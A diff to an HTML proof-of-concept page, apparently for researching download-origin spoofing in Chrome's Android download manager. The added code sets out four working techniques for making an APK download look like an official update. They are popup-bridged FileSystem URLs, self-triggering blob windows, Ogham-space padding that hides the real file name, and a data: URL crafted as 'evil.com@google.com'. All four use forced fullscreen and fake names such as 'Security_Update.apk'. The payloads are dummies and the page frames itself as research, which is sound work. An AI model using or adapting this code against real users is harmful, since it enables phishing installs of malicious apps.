@@ -2,72 +2,128 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>FileSystem + Window Open PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chromium Android Security Research POC</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; }
-        #trigger { padding: 20px; font-size: 18px; background: #d93025; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 20px; }
+        .card { background: #2d2d2d; border-radius: 12px; padding: 20px; margin: 10px auto; max-width: 500px; border: 1px solid #444; }
+        h2 { color: #00e676; }
+        button { 
+            width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 6px; 
+            font-weight: bold; cursor: pointer; transition: 0.2s;
+        }
+        .btn-fs { background: #ff5252; color: white; }
+        .btn-blob { background: #448aff; color: white; }
+        .btn-ui { background: #ffd740; color: #000; }
+        .btn-auth { background: #e0e0e0; color: #000; }
+        button:hover { opacity: 0.8; transform: scale(1.02); }
+        #log { font-family: monospace; background: #000; color: #00e676; padding: 15px; border-radius: 6px; margin-top: 20px; text-align: left; font-size: 12px; }
     </style>
 </head>
 <body>
 
-    <h2>Research: Hybrid FileSystem & Window Context</h2>
-    <p>Metode ini menggabungkan FileSystem API dengan jendela baru dan jeda waktu.</p>
-    
-    <button id="trigger">Jalankan Hybrid Attack</button>
+    <h2>Master PoC: Origin & UI Attribution</h2>
+    <p>Gunakan untuk menguji celah pada Chrome Android Download Manager.</p>
 
-    <div id="status" style="margin-top: 20px; color: blue;"></div>
+    <div class="card">
+        <!-- Metode 1: Hybrid FileSystem + Window -->
+        <button class="btn-fs" onclick="runHybridFS()">1. Run Hybrid FileSystem + Window</button>
+
+        <!-- Metode 2: Blob URL Context -->
+        <button class="btn-blob" onclick="runBlobContext()">2. Run Blob URL Context</button>
+
+        <!-- Metode 3: UI Space Injection -->
+        <button class="btn-ui" onclick="runSpaceInjection()">3. Run UI Space Injection</button>
+
+        <!-- Metode 4: Original Authority Injection -->
+        <button class="btn-auth" onclick="runAuthInjection()">4. Run Authority Injection</button>
+    </div>
+
+    <div id="log">Status: Awaiting action...</div>
 
     <script>
-        document.getElementById('trigger').addEventListener('click', function() {
-            const status = document.getElementById('status');
-            status.innerText = "Meminta akses FileSystem...";
+        const logger = document.getElementById('log');
+        const updateLog = (msg) => logger.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
 
-            // 1. Inisialisasi FileSystem
+        function goFS() {
+            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            else if (document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
+        }
+
+        // --- 1. HYBRID FILESYSTEM + WINDOW ---
+        function runHybridFS() {
+            updateLog("Initializing FileSystem...");
             window.requestFileSystem = window.requestFileSystem || window.webkitRequestFileSystem;
+            if (!window.requestFileSystem) return updateLog("Error: FileSystem API not supported.");
 
-            if (!window.requestFileSystem) {
-                status.innerText = "Browser tidak mendukung FileSystem API.";
-                return;
-            }
-
-            window.requestFileSystem(window.TEMPORARY, 1024 * 1024, function(fs) {
-                // 2. Buat file dummy secara internal
-                fs.root.getFile('security_update.apk', { create: true }, function(fileEntry) {
-                    fileEntry.createWriter(function(fileWriter) {
-                        const blob = new Blob(['dummy_data_poc'], { type: 'application/vnd.android.package-archive' });
-                        
-                        fileWriter.onwriteend = function() {
+            window.requestFileSystem(window.TEMPORARY, 1024*1024, (fs) => {
+                fs.root.getFile('update.apk', { create: true }, (fileEntry) => {
+                    fileEntry.createWriter((fileWriter) => {
+                        const blob = new Blob(['poc_data'], { type: 'application/vnd.android.package-archive' });
+                        fileWriter.onwriteend = () => {
                             const fsURL = fileEntry.toURL();
-                            status.innerText = "File siap. Membuka jendela baru...";
-
-                            // 3. Buka jendela baru sebagai "Origin Bridge"
-                            const win = window.open("https://google.com", "_blank", "width=200,height=200");
-                            
+                            const win = window.open("", "_blank", "width=200,height=200");
                             if (win) {
-                                win.document.write("<h3>Memproses Unduhan Aman...</h3>");
-                                
-                                // 4. SetTimeout untuk memicu unduhan dari jendela baru
-                                setTimeout(function() {
+                                updateLog("Window opened. Triggering FS download in 2s...");
+                                setTimeout(() => {
                                     const a = win.document.createElement("a");
                                     a.href = fsURL;
-                                    a.download = "Chrome_Update_Global.apk";
+                                    a.download = "Security_Update.apk";
                                     win.document.body.appendChild(a);
                                     a.click();
-                                    
-                                    status.innerText = "Unduhan dipicu dari jendela baru.";
-                                    
-                                    // Tutup kembali jendela setelah beberapa detik
-                                    setTimeout(() => { win.close(); }, 3000);
-                                }, 2000); // Jeda 2 detik agar UI Android sempat melakukan polling origin
-                            } else {
-                                status.innerText = "Pop-up terblokir.";
+                                    setTimeout(() => win.close(), 3000);
+                                }, 2000);
                             }
                         };
                         fileWriter.write(blob);
                     });
                 });
             });
-        });
+        }
+
+        // --- 2. BLOB URL CONTEXT ---
+        function runBlobContext() {
+            updateLog("Creating Blob Context...");
+            const html = `
+                <script>
+                    const a = document.createElement("a");
+                    a.href = "data:application/octet-stream;base64,ZXN0dGVzdHRlc3Q=";
+                    a.download = "Chrome_Fix.apk";
+                    a.click();
+                    setTimeout(() => window.close(), 1000);
+                <\/script>
+            `;
+            const blob = new Blob([html], {type: 'text/html'});
+            const url = URL.createObjectURL(blob);
+            window.open(url, "_blank");
+            updateLog("Blob window triggered.");
+        }
+
+        // --- 3. UI SPACE INJECTION ---
+        function runSpaceInjection() {
+            updateLog("Running Space Injection...");
+            goFS();
+            // Menggunakan karakter Ogham Space (\u1680) untuk mengisi kekosongan UI
+            const fakeName = "Google_Safety_Check" + "\u1680".repeat(40) + "update.apk";
+            setTimeout(() => {
+                const a = document.createElement("a");
+                a.href = "data:application/vnd.android.package-archive;base64,ZXN0dGVzdHRlc3Q=";
+                a.download = fakeName;
+                a.click();
+            }, 1000);
+        }
+
+        // --- 4. AUTHORITY INJECTION ---
+        function runAuthInjection() {
+            updateLog("Running Authority Injection...");
+            goFS();
+            setTimeout(() => {
+                const a = document.createElement("a");
+                a.href = "data:/\\/evil.com@google.com/application/x-msdownload;base64,ZXN0dGVzdHRlc3Q=";
+                a.download = "system_patch.apk";
+                a.click();
+            }, 1000);
+        }
     </script>
 </body>
 </html>
